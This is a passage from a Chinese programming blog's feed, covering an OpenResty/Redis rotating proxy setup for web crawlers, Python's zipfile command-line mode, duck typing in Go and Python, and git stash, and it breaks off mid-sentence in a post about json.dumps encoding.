tcp_proxy &apos;$remote_addr [$time_local] &apos;</span><br><span class="line">                         &apos;$protocol $status $bytes_sent $bytes_received &apos;</span><br><span class="line">                         &apos;$session_time &quot;$upstream_addr&quot; &apos;</span><br><span class="line">                         &apos;&quot;$upstream_bytes_sent&quot; &quot;$upstream_bytes_received&quot; &quot;$upstream_connect_time&quot;&apos;;</span><br><span class="line">    ## TCP 代理日志配置</span><br><span class="line">    access_log /usr/local/openresty/nginx/logs/access.log tcp_proxy;</span><br><span class="line">    open_log_file_cache off;</span><br><span class="line"></span><br><span class="line">    ## TCP 代理配置</span><br><span class="line">    upstream backend&#123;</span><br><span class="line">        server 127.0.0.2:1101;# 爱写啥写啥  反正下面的代码也给你改了</span><br><span class="line">        balancer_by_lua_block &#123;</span><br><span class="line">            -- 初始化balancer</span><br><span class="line">            local balancer = require &quot;ngx.balancer&quot;</span><br><span class="line">            local host = &quot;&quot;</span><br><span class="line">            local port = 0</span><br><span class="line">            host = ngx.ctx.proxy_host</span><br><span class="line">            port = ngx.ctx.proxy_port</span><br><span class="line">            -- 设置 balancer</span><br><span class="line">            local ok, err = balancer.set_current_peer(host, port)</span><br><span class="line">            if not ok then</span><br><span class="line">                ngx.log(ngx.ERR, &quot;failed to set the peer: &quot;, err)</span><br><span class="line">            end</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        preread_by_lua_block&#123;</span><br><span class="line"></span><br><span class="line">            local redis = require(&quot;resty.redis&quot;)</span><br><span class="line">            --创建实例</span><br><span class="line">            local redis_instance = redis:new()</span><br><span class="line">            --设置超时（毫秒）</span><br><span class="line">            redis_instance:set_timeout(3000)</span><br><span class="line">            --建立连接，请在这里配置Redis 的 IP 地址、端口号、密码和用到的 Key</span><br><span class="line">            local rhost = &quot;123.45.67.89&quot;</span><br><span class="line">            local rport = 6739</span><br><span class="line">            local rpass = &quot;abcdefg&quot;</span><br><span class="line">            local rkey = &quot;proxy:pool&quot;</span><br><span class="line">            local ok, err = redis_instance:connect(rhost, rport)</span><br><span class="line">            ngx.log(ngx.ERR, &quot;1111111 &quot;, ok, &quot; &quot;, err)</span><br><span class="line"></span><br><span class="line">            -- 如果没有密码，移除下面这一行</span><br><span class="line">            local res, err = redis_instance:auth(rpass)</span><br><span class="line">            local res, err = redis_instance:hkeys(rkey)</span><br><span class="line">            if not res then</span><br><span class="line">                ngx.log(ngx.ERR,&quot;res num error : &quot;, err)</span><br><span class="line">                return redis_instance:close()</span><br><span class="line">            end</span><br><span class="line">            math.randomseed(tostring(ngx.now()):reverse():sub(1, 6))</span><br><span class="line">            local proxy = res[math.random(#res)]</span><br><span class="line">            local colon_index = string.find(proxy, &quot;:&quot;)</span><br><span class="line">            local proxy_ip = string.sub(proxy, 1, colon_index - 1)</span><br><span class="line">            local proxy_port = string.sub(proxy, colon_index + 1)</span><br><span class="line">            ngx.log(ngx.ERR,&quot;redis data = &quot;, proxy_ip, &quot;:&quot;, proxy_port);</span><br><span class="line">            ngx.ctx.proxy_host = proxy_ip</span><br><span class="line">            ngx.ctx.proxy_port = proxy_port</span><br><span class="line">            redis_instance:close()</span><br><span class="line">        &#125;</span><br><span class="line">        #  下面是本机的端口，也就是爬虫固定写死的端口</span><br><span class="line">       listen 0.0.0.0:9976; #监听本机地址和端口，当使用keeplived的情况下使用keeplived VIP</span><br><span class="line">       proxy_connect_timeout 3s;</span><br><span class="line">       proxy_timeout 10s;</span><br><span class="line">       proxy_pass backend; #这里填写对端的地址</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要修改的地方，我在配置文件里面已经做好的注释。具体而言，需要修改地方包含：</p><ul><li>Redis的地址、端口、密码和 Key。如果你的Redis没有密码，可以把设置密码的这一行删掉</li></ul><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-23-21-18-54.png" alt></p><ul><li>入口代理的端口<br><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-23-21-19-36.png" alt></li></ul><p>设置好了这些配置以后，我们就可以使用Docker来启动它。Docker的配置文件极其简单：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> openresty/openresty:centos</span><br><span class="line"></span><br><span class="line"><span class="keyword">copy</span><span class="bash"> nginx_redis.conf /usr/<span class="built_in">local</span>/openresty/nginx/conf/nginx.conf</span></span><br></pre></td></tr></table></figure><p>然后，执行命令构建和运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker build --network host -t tunnel_proxy:0.01 .</span><br><span class="line">docker run --name tunnel_proxy --network host -it tunnel_proxy:0.01</span><br></pre></td></tr></table></figure><p>运行以后，你会看到Docker的命令行似乎卡住了。这是正常请求。因为需要你有了请求，它才会输出内容。</p><p>现在，你可以用Requests赶快写一段代码来进行验证：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">proxies = &#123;<span class="string">'http'</span>: <span class="string">'http://13.88.220.207:9976'</span>&#125;</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    resp = requests.get(<span class="string">'http://httpbin.org/ip'</span>, proxies=proxies).text</span><br><span class="line">    print(resp)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>运行效果如下图所示。</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-23-08-41-21.png" alt></p><p>说明隧道代理搭建成功。目前隧道代理我已经稳定运行了半年，从来没有出过问题，大家可以放心使用。</p><p>最后，本文受到 @萌木盖 的文章：<a href="https://www.jianshu.com/p/7808ee6395ab" target="_blank" rel="noopener">openresty正向代理搭建 - 简书</a>的启发，并在该文章基础上进行改进。特别感谢原作者。</p><hr><p>如果本文讲到的方法，能帮你节省下不少购买隧道代理的钱，那么请考虑拿出其中的一小部分，加入我的知识星球，成为<code>未闻Code·Pro会员</code>。</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/51122141524284T2.JPG" alt></p><p>加入星球，你除了能获得在微信群中已有的全部福利外，还会额外获得：</p><ol><li>问题的优先解答和一对一答疑</li><li>职业生涯规划咨询</li><li>面试技巧和经验</li><li>定期开展的专属直播分享</li><li>定期抽奖活动</li><li>……</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;什么是隧道代理？我们来看下面这张截图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-23-08-41-21.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;所谓隧道代理，就是一个能帮你自动更换代理 IP 的代理服务。在你的代码里面，你只需要把一个入口代理地址写死，然后正常发起请求，而目标服务器接收到的请求，每一次都是不同的代理地址。&lt;/p&gt;
&lt;p&gt;在某代理网站上，隧道代理50并发每秒的价格是4000元/月：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-23-08-47-07.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;而常规的，先请求接口拿到一批代理 IP，再选一个发起请求的原始代理服务器，一个月价格才600多元：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-23-08-49-41.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;所以，如果我们能自己做一个隧道代理，将会省下很多钱！&lt;/p&gt;
    
    </summary>
    
      <category term="爬虫" scheme="https://www.kingname.info/categories/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="爬虫" scheme="https://www.kingname.info/tags/%E7%88%AC%E8%99%AB/"/>
    
      <category term="隧道代理" scheme="https://www.kingname.info/tags/%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/"/>
    
      <category term="OpenResty" scheme="https://www.kingname.info/tags/OpenResty/"/>
    
  </entry>
  
  <entry>
    <title>一日一技：Linux 中，没有 zip命令，怎么生成 zip 文件？</title>
    <link href="https://www.kingname.info/2021/07/03/compress-without-zip/"/>
    <id>https://www.kingname.info/2021/07/03/compress-without-zip/</id>
    <published>2021-07-03T14:25:47.000Z</published>
    <updated>2021-07-03T14:26:56.278Z</updated>
    
    <content type="html"><![CDATA[<p>大家有时候可能需要在 Linux 上面生成 zip 文件或者对一个 zip 文件进行解压。如果你在网上搜索怎么在 Linux 解压 zip 文件，你一般会看到下面这样的回答：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-06-29-20-22-00.png" alt></p><p>但如果你手边刚好有一台 Linux 服务器的话，你可以试一试，一般你会得到这样的返回：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-06-29-20-22-47.png" alt></p><a id="more"></a><p>这是因为，<code>zip</code>、<code>unzip</code> 这两个命令，是需要单独安装的，并不是系统默认的命令。但有时候，我们拿到的 Linux 服务器并没有管理员权限，我们不能自己安装任何东西，只能使用系统已有的命令。</p><p>一般主流的 Linux 发行版都会默认自带 Python。有了 Python，我们也可以对文件进行压缩。可能有人又说，他不会 Python、或者他不会 Vim，在 Linux 上写代码太麻烦。</p><p>今天我们讲一个方法，只需要执行命令，不需要写 Python 代码。</p><p>命令的格式为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 把一个或多个文件压缩到一个 zip 文件中</span></span><br><span class="line">python -m zipfile -c xxx.zip 文件<span class="number">1</span> 文件<span class="number">2</span> 文件<span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 把一个文件夹压缩</span></span><br><span class="line">python -m zipfile -c monty.zip 文件夹名</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解压一个 zip 文件到指定文件夹中</span></span><br><span class="line">python -m zipfile -e xxx.zip 目标文件夹名</span><br></pre></td></tr></table></figure><p>就这么简单，无论你想压缩一个或多个文件，还是想压缩整个文件夹，还是想解压一个 zip 文件，都可以使用上面的命令轻松搞定。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;大家有时候可能需要在 Linux 上面生成 zip 文件或者对一个 zip 文件进行解压。如果你在网上搜索怎么在 Linux 解压 zip 文件，你一般会看到下面这样的回答：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-06-29-20-22-00.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;但如果你手边刚好有一台 Linux 服务器的话，你可以试一试，一般你会得到这样的返回：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-06-29-20-22-47.png&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="https://www.kingname.info/categories/Python/"/>
    
    
      <category term="Python" scheme="https://www.kingname.info/tags/Python/"/>
    
      <category term="一日一技" scheme="https://www.kingname.info/tags/%E4%B8%80%E6%97%A5%E4%B8%80%E6%8A%80/"/>
    
      <category term="Linux" scheme="https://www.kingname.info/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>面试扣分点：什么是鸭子类型</title>
    <link href="https://www.kingname.info/2021/07/03/what-is-duck-type/"/>
    <id>https://www.kingname.info/2021/07/03/what-is-duck-type/</id>
    <published>2021-07-03T14:22:55.000Z</published>
    <updated>2021-07-03T14:27:10.600Z</updated>
    
    <content type="html"><![CDATA[<p>有一类面试官特别讨厌，面试的时候，会问一些偏、难、怪的题目。假设你今天去面试，遇到面试官问你：“什么是鸭子类型？”。你怎么回答？</p><p>熟读维基百科的你，脑海中闪过了下面这张截图：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-01-23-07-04.png" alt></p><p>图中的红框像闪电一样从你的脑子里划过。你用中指扶了扶黑框眼镜，自信地说道：</p><blockquote><p>鸭子类型就是说，一个函数不会关心它传入参数的类型，只关心这个参数对应的对象有没有自己想要的方法和属性。如果有，就能运行。如果没有，就不能运行。这就像是我看到了一只鸟，只要它能像鸭子一样叫，像鸭子一样走路，有鸭子一样的白色羽毛，那么，无论它实际上是什么东西，我都认为它是鸭子。</p></blockquote><p>说完这段话，一道光从你的镜片上一闪而过。你心里想，这下稳了。</p><a id="more"></a><p>面试官又问：那你用 Golang 写一个鸭子类型的例子。</p><p>你一想，Golang 是静态语言啊，参数都要声明类型的，怎么绕过它的类型检测呢？你又转念再一想，不对，Golang 确实可以绕过类型检测的。使用接口就可以了。</p><p>于是你刷刷刷写下来一段 Golang 语言的代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Animal <span class="keyword">interface</span> &#123;</span><br><span class="line">    Sleep()</span><br><span class="line">    Eat(food <span class="keyword">string</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> People <span class="keyword">struct</span> &#123;</span><br><span class="line">    name <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Pet <span class="keyword">struct</span> &#123;</span><br><span class="line">    name <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p People)</span> <span class="title">Sleep</span><span class="params">()</span></span>&#123;</span><br><span class="line">    fmt.Println(p.name, <span class="string">"在睡觉"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p Pet)</span> <span class="title">Sleep</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(p.name, <span class="string">"在睡觉"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p People)</span> <span class="title">Eat</span><span class="params">(food <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">    fmt.Printf(<span class="string">"%s在吃%s\n"</span>, p.name, food)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p Pet)</span> <span class="title">Eat</span><span class="params">(food <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">    fmt.Printf(<span class="string">"%s在吃%s\n"</span>, p.name, food)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">check</span><span class="params">(animal Animal)</span></span> &#123;</span><br><span class="line">    animal.Eat(<span class="string">"狗狼"</span>)</span><br><span class="line">    animal.Sleep()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    singleDog := People&#123;name: <span class="string">"单身狗"</span>,&#125;</span><br><span class="line">    dog := Pet&#123;name: <span class="string">"旺财"</span>,&#125;</span><br><span class="line">    check(singleDog)</span><br><span class="line">    check(dog)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-01-23-38-04.png" alt></p><p>然后你解释道，在函数<code>main()</code>里面，变量<code>singleDog</code>的类型是 <code>People</code> 类型，变量<code>dog</code>的类型是<code>Pet</code>类型。虽然他们是不同的类型，但是由于他们都有<code>Eat</code>方法和<code>Sleep</code>方法，所以，他们都能在<code>check</code>函数里面运行。</p><p>面试官又问，你的代码写得没有问题，例子也举得没有问题。那我再问你，既然<code>check</code>函数不关心传入参数的类型，只关心他们的方法，是不是说明<code>check</code>函数接收的参数是鸭子类型？</p><p>你说，是的。</p><p>面试官又问，但是，我们从代码里面可以看到，<code>check</code>函数接收的这个参数<code>animal</code>的类型是接口类型。那是不是说明<code>接口类型</code>等于<code>鸭子类型</code>？</p><p>你一时回答不上来。</p><p>面试官又问：那接口类型和鸭子类型是什么关系？鸭子类型是像<code>int</code>、<code>string</code>、<code>map</code>这样内置的类型吗？我们可以在 Golang 里面使用<code>var a  string</code> 声明一个类型为<code>string</code>的变量，那请问怎么声明一个类型为鸭子的变量？</p><p>你一时想不起来 Golang 自带的关键词里面，哪个关键词包含<code>duck</code>这个单词。</p><p>面试官露出了耐克式的微笑，对你说：“回家等通知吧。”</p><p>这个讨厌的面试官最后一个问题把你难住了。但是这个问题其实是一个陷阱。面试官给你玩了一个文字游戏。当他把<code>鸭子类型</code>和<code>整型、字符串类型</code>合在一起说的时候，让你觉得<code>鸭子类型</code>也是一种类型。但实际上<code>鸭子类型</code>并不是一种类型，<code>鸭子类型</code>是一种动态类型的风格：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-01-23-55-07.png" alt></p><p>怎么解释什么叫做设计风格呢？我们再用 Python 举个例子：</p><ul><li>确保传入的变量必须是特定类型，再执行对应的方法</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 确保参数是特定类型再调用里面的方法</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(animal)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(animal, Pet):</span><br><span class="line">        animal.eat()</span><br><span class="line">    <span class="keyword">elif</span> isinstance(animal, People):</span><br><span class="line">        animal.eat()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">"类型错误！"</span>)</span><br></pre></td></tr></table></figure><ul><li>不管传入的参数是什么类型，只要它有 <code>eat</code>方法都能执行。如果这个对象没有<code>eat</code>方法，Python 自动就会抛出异常。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(animal)</span>:</span></span><br><span class="line">    animal.eat()</span><br></pre></td></tr></table></figure><p>在鸭子类型这种设计<code>风格</code>中，开发者不关心对象是什么类型。它只关心对象有没有特定的方法。</p><p>总结：鸭子类型是一种设计风格，不是一种具体的类型。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;有一类面试官特别讨厌，面试的时候，会问一些偏、难、怪的题目。假设你今天去面试，遇到面试官问你：“什么是鸭子类型？”。你怎么回答？&lt;/p&gt;
&lt;p&gt;熟读维基百科的你，脑海中闪过了下面这张截图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-01-23-07-04.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;图中的红框像闪电一样从你的脑子里划过。你用中指扶了扶黑框眼镜，自信地说道：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;鸭子类型就是说，一个函数不会关心它传入参数的类型，只关心这个参数对应的对象有没有自己想要的方法和属性。如果有，就能运行。如果没有，就不能运行。这就像是我看到了一只鸟，只要它能像鸭子一样叫，像鸭子一样走路，有鸭子一样的白色羽毛，那么，无论它实际上是什么东西，我都认为它是鸭子。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;说完这段话，一道光从你的镜片上一闪而过。你心里想，这下稳了。&lt;/p&gt;
    
    </summary>
    
      <category term="面试" scheme="https://www.kingname.info/categories/%E9%9D%A2%E8%AF%95/"/>
    
    
      <category term="面试" scheme="https://www.kingname.info/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>一日一技：使用 Git 在错误的分支上修改了代码怎么办？</title>
    <link href="https://www.kingname.info/2021/07/03/use-git-stash/"/>
    <id>https://www.kingname.info/2021/07/03/use-git-stash/</id>
    <published>2021-07-03T14:17:13.000Z</published>
    <updated>2021-07-03T14:27:25.551Z</updated>
    
    <content type="html"><![CDATA[<p>我们知道，在使用 Git 的时候，应该要正确使用它的分支（Branch）功能。不同的功能使用不同的分支开发，最后合并进入主分支。但有时候会出现这样一种情况——我代码都已经写完了，才发现我写错分支了。这个时候，怎么把我的修改迁移到目标分支上，并且不修改现在正在使用的分支？</p><a id="more"></a><p>我们用一个简单的例子来说明这种情况。</p><p>首先创建一个文件夹：<code>test_git</code>，并且在里面创建一个1.txt 文件，这个文件的内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">11111</span><br><span class="line">22222</span><br><span class="line">33333</span><br><span class="line">44444</span><br><span class="line">aaaaa</span><br><span class="line">bbbbb</span><br><span class="line">ccccc</span><br></pre></td></tr></table></figure><p>如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-02-20-03-26.png" alt></p><p>接下来，我执行命令<code>git init</code>，把当前文件夹作为一个git 源，并把1.txt 提交到源里面，让 git 进行管理。</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-02-20-04-45.png" alt></p><p>现在，我基于当前分支，创建一个<code>dev</code>分支。并对新分支里面的1.txt 文件进行修改：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b dev</span><br><span class="line">vim 1.txt</span><br><span class="line">git add 1.txt</span><br><span class="line">git commit -m <span class="string">'change 1.txt'</span></span><br></pre></td></tr></table></figure><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-02-20-06-15.png" alt></p><p>好了，现在准备工作做完了。我现在有两个分支<code>master</code>和<code>dev</code>。每个分支里面都有一个叫做<code>1.txt</code>的文件。并且这两个<code>1.txt</code>文件的内容前半截相同，后半截不同。</p><p>大家可以看到，我现在在 dev 分支上。这个时候，我想修改 master 分支上面的1.txt。但是我忘记切换分支了。于是直接修改了dev 分支上的1.txt：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-02-20-08-23.png" alt="红框中的内容，原本是想在 master 分支修改的"></p><p>这个时候，如果我直接使用命令<code>git checkout master</code>试图切换分支，git 会报错，没有办法切过去：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-02-20-09-24.png" alt></p><p>很多人可能会这样做：打开一个记事本，把1.txt 里面修改的内容记录下来。然后使用命令<code>git checkout -- 1.txt</code>恢复1.txt 到修改之前的内容。然后切换到 master 分支。再根据记事本里面记录的修改内容，把代码粘贴到1.txt 文件中。如果只有1个文件修改那还好。但是在软件开发中，可能你修改了很多个文件。所以这种方法会变得非常笨拙。</p><p>但实际上，git 早就预料到了你有这个需求，所以它已经有了应对方案。我们现在回到刚刚在 dev 分支修改了1.txt 的时候：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-02-20-12-08.png" alt></p><p>这个时候，<strong>千万不要</strong>执行<code>git add</code>命令。</p><p>你只需要按顺序执行如下三条命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git stash</span><br><span class="line">git checkout master</span><br><span class="line">git stash pop</span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-02-20-13-52.png" alt></p><p>然后，我们打开1.txt 文件：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-02-20-15-00.png" alt></p><p>可以看到，刚才的修改已经自动应用到了master 分支的1.txt 上面了。</p><p><code>git stash</code>会把当前修改的内容缓存起来，并恢复当前工作区到你修改之前的状态。然后切换回 master 分支，执行命令<code>git stash pop</code>，把刚才的修改应用到 master 分支的1.txt 文件中。如果不出现冲突，那么它会自动修改1.txt 文件。如果出现了冲突，那么需要你打开1.txt 文件以后，手动解除冲突。</p><p>可以看到，使用<code>git stash</code>命令，比你单独手动记录修改的内容，切换分支再重新改一遍要方便很多。</p><p>更多 Git 相关的小技巧，大家可以在微软提供的学习网站进行学习：<a href="https://docs.microsoft.com/en-us/learn/modules/intro-to-git/?WT.mc_id=DT-MVP-5003916" target="_blank" rel="noopener">Introduction to Git - Learn | Microsoft Docs</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我们知道，在使用 Git 的时候，应该要正确使用它的分支（Branch）功能。不同的功能使用不同的分支开发，最后合并进入主分支。但有时候会出现这样一种情况——我代码都已经写完了，才发现我写错分支了。这个时候，怎么把我的修改迁移到目标分支上，并且不修改现在正在使用的分支？&lt;/p&gt;
    
    </summary>
    
      <category term="Git" scheme="https://www.kingname.info/categories/Git/"/>
    
    
      <category term="Git" scheme="https://www.kingname.info/tags/Git/"/>
    
  </entry>
  
  <entry>
    <title>为什么爬虫工程师应该有一些基本的后端常识？</title>
    <link href="https://www.kingname.info/2021/06/19/crawler-should-know-backend/"/>
    <id>https://www.kingname.info/2021/06/19/crawler-should-know-backend/</id>
    <published>2021-06-19T08:50:43.000Z</published>
    <updated>2021-06-19T08:51:46.804Z</updated>
    
    <content type="html"><![CDATA[<p>今天在粉丝交流群里面，有个同学说他发现了<code>Requests</code>的一个 bug，并修复了它：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-06-19-15-28-54.png" alt></p><p>聊天记录中对应的图片为：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-06-19-15-29-19.png" alt></p><p>看到这个同学的截图，我大概知道他遇到了什么问题，以及为什么会误认为这是 Requests 的 bug。</p><a id="more"></a><p>要解释这个问题，我们需要首先明白一个问题，那就是 JSON 字符串的两种显示形式和<code>json.dumps</code>的<code>ensure_ascii</code>参数。</p><p>假设我们在 Python 里面有一个字典：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info = &#123;<span class="string">'name'</span>: <span class="string">'青南'</span>, <span class="string">'age'</span>: <span class="number">20</span>&#125;</span><br></pre></td></tr></table></figure><p>当我们想把它转成 JSON 字符串的时候，我们可能会这样写代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line">info = &#123;<span class="string">'name'</span>: <span class="string">'青南'</span>, <span class="string">'age'</span>: <span class="number">20</span>&#125;</span><br><span class="line">info_str = json.dumps(info)</span><br><span class="line">print(info_str)</span><br></pre></td></tr></table></figure><p>运行效果如下图所示，中文变成了 Unicode 码：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-06-19-15-33-18.png" alt></p><p>我们也可以增加一个参数<code>ensure_ascii=False</code>，让中文正常显示出来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info_str = json.dumps(info, ensure_ascii=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-06-19-15-34-30.png" alt></p><p>这位同学认为，由于<code>{&quot;name&quot;: &quot;\u9752\u5357&quot;, &quot;age&quot;: 20}</code>和<code>{&quot;name&quot;: &quot;青南&quot;, &quot;age&quot;: 20}</code>从字符串角度看，显然不相等。而 Requests 在 